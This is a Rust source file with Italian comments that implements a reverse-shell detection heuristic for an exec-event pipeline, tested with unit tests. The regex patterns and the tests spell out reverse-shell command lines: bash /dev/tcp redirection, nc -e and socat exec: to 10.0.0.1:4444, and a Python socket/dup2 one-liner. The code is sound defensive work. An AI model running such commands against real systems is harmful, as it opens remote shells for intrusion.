//! Euristiche per il rilevamento di reverse shell.
//!
//! Una reverse shell tipicamente si manifesta con uno dei pattern
//! seguenti, osservabili tramite la combinazione di eventi `exec` e
//! `connect` già disponibili nella pipeline:
//!
//! 1. Un interprete di shell (`bash`, `sh`, `zsh`, `dash`) eseguito con
//!    flag interattivi (`-i`) subito dopo (o come discendente diretto di)
//!    un processo che ha appena effettuato una `connect` verso una porta
//!    non standard.
//! 2. Utility di rete generiche (`nc`, `ncat`, `socat`) usate con opzioni
//!    di esecuzione di comandi (`-e`, `exec:`).
//! 2. Un linguaggio di scripting (`python`, `perl`, `php`, `ruby`) che
//!    apre un socket e poi duplica i file descriptor su stdin/stdout
//!    (pattern classico `os.dup2`), rilevabile a partire dagli argomenti
//!    di `execve` catturati.
//!
//! In questa implementazione ci basiamo sul matching de espressioni
//! regolari sugli argomenti di `execve`, combinato con l'informazione di
//! processo padre (per rilevare shell spawnate da processi non
//! interattivi, es. web server), rimandando il matching più sofisticato
//! su combinazioni cross-evento al rules engine (Parte 10), che ha
//! visibilità sull'intera sequenza di eventi correlati.

use once_cell::sync::Lazy;
use regex::Regex;

use crate::events::{Enricher, EventKind, EventPayload, NormalizedEvent};

pub const TAG_SUSPECTED_REVERSE_SHELL: &str = "suspected_reverse_shell";

/// Pattern di comando associati a reverse shell interattive tramite
/// interpreti di shell standard (`bash -i`, `sh -i`, ridirezioni verso
/// `/dev/tcp/`).
static SHELL_INTERACTIVE_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(bash|sh|zsh|dash)\s+.*-i\b").expect("valid regex")
});

/// Pattern per redirezioni verso `/dev/tcp/` o `/dev/udp/`, tecnica bash
/// nativa per aprire socket senza utility esterne.
static DEV_TCP_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"/dev/(tcp|udp)/").expect("valid regex"));

/// Pattern per `nc`/`ncat`/`netcat` con esecuzione di comandi (`-e`) o
/// `socat` con `exec:`/`system:`.
static NC_SOCAT_EXEC_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(nc|ncat|netcat)(\.\w+)?\s+.*-e\b|socat\s+.*(exec|system):")
        .expect("valid regex")
});

/// Pattern per script Python/Perl/Ruby/PHP con `socket`+`dup2`, indicativo
/// di reverse shell scritte in linguaggi di scripting.
static SCRIPTING_SOCKET_DUP2_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(python[23]?|perl|ruby|php)\s+.*(socket|dup2)").expect("valid regex")
});

/// Valuta la stringa completa di comando (filename + argomenti uniti) e
/// restituisce `true` se corrisponde a uno dei pattern noti di reverse
/// shell. Funzione pura, testabile senza dipendere da `NormalizedEvent`.
pub fn matches_reverse_shell_pattern(command_line: &str) -> bool {
    SHELL_INTERACTIVE_PATTERN.is_match(command_line)
        || DEV_TCP_PATTERN.is_match(command_line)
        || NC_SOCAT_EXEC_PATTERN.is_match(command_line)
        || SCRIPTING_SOCKET_DUP2_PATTERN.is_match(command_line)
}

/// Arricchitore che applica le euristiche di reverse shell agli eventi
/// `exec`, taggando quelli sospetti.
pub struct ReverseShellDetector;

impl Enricher for ReverseShellDetector {
    fn enrich(&self, event: &mut NormalizedEvent) {
        if event.event_kind != EventKind::Exec {
            return;
        }

        let EventPayload::Exec { filename, args } = &event.payload else {
            return;
        };

        let command_line = format!("{filename} {}", args.join(" "));

        if matches_reverse_shell_pattern(&command_line) {
            event.tags.push(TAG_SUSPECTED_REVERSE_SHELL.to_string());
            tracing::warn!(
                pid = event.process.pid,
                comm = %event.process.comm,
                command = %command_line,
                "suspected reverse shell pattern detected"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_interactive_bash_shell() {
        assert!(matches_reverse_shell_pattern("bash -i"));
        assert!(matches_reverse_shell_pattern("/bin/sh -i"));
    }

    #[test]
    fn detects_dev_tcp_redirection() {
        assert!(matches_reverse_shell_pattern(
            "bash -c exec 5<>/dev/tcp/10.0.0.1/4444"
        ));
    }

    #[test]
    fn detects_netcat_exec_flag() {
        assert!(matches_reverse_shell_pattern("nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches_reverse_shell_pattern("ncat -e /bin/bash 10.0.0.1 4444"));
    }

    #[test]
    fn detects_socat_exec() {
        assert!(matches_reverse_shell_pattern(
            "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh"
        ));
    }

    #[test]
    fn detects_python_socket_dup2() {
        assert!(matches_reverse_shell_pattern(
            "python3 -c import socket,os,pty;s=socket.socket();dup2(s.fileno(),0)"
        ));
    }

    #[test]
    fn does_not_flag_benign_commands() {
        assert!(!matches_reverse_shell_pattern("ls -la /home"));
        assert!(!matches_reverse_shell_pattern("bash script.sh"));
        assert!(!matches_reverse_shell_pattern("nc -zv 10.0.0.1 80"));
    }
}